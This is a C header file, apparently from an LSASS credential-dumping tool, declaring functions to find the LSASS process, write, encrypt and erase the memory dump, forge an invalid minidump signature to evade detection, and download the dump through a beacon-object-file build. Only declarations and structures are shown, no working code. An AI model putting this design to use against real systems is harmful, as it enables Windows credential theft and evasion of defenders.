#pragma once

typedef struct _linked_list
{
    struct _linked_list* next;
} linked_list, *Plinked_list;

BOOL is_full_path(LPCSTR filename);
LPCWSTR get_cwd(VOID);
VOID get_full_path(PUNICODE_STRING full_dump_path, LPCSTR filename);
BOOL wait_for_process(HANDLE hProcess);
BOOL delete_file(LPCSTR filepath);
BOOL file_exists(LPCSTR filepath);
DWORD get_lsass_pid(void);
void print_success(LPCSTR dump_path, BOOL use_valid_sig, BOOL write_dump_to_disk);
void free_linked_list(PVOID head);
PVOID allocate_memory(PSIZE_T RegionSize);
void encrypt_dump(Pdump_context dc);
void erase_dump_from_memory(Pdump_context dc);
void generate_invalid_sig(PULONG32 Signature, PSHORT Version, PSHORT ImplementationVersion);
BOOL create_file(PUNICODE_STRING full_dump_path);
BOOL write_file(PUNICODE_STRING full_dump_path, PBYTE fileData, ULONG32 fileLength);
#ifdef BOF
BOOL download_file(LPCSTR fileName, char fileData[], ULONG32 fileLength);
#endif

struct _CURDIR
{
    struct _UNICODE_STRING DosPath;
    VOID* Handle;
};

typedef struct _PROCESS_PARAMETERS
{
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    VOID* ConsoleHandle;
    ULONG ConsoleFlags;
    VOID* StandardInput;
    VOID* StandardOutput;
    VOID* StandardError;
    struct _CURDIR CurrentDirectory;
    struct _UNICODE_STRING DllPath;
    struct _UNICODE_STRING ImagePathName;
    struct _UNICODE_STRING CommandLine;
} PROCESS_PARAMETERS, *PPROCESS_PARAMETERS;
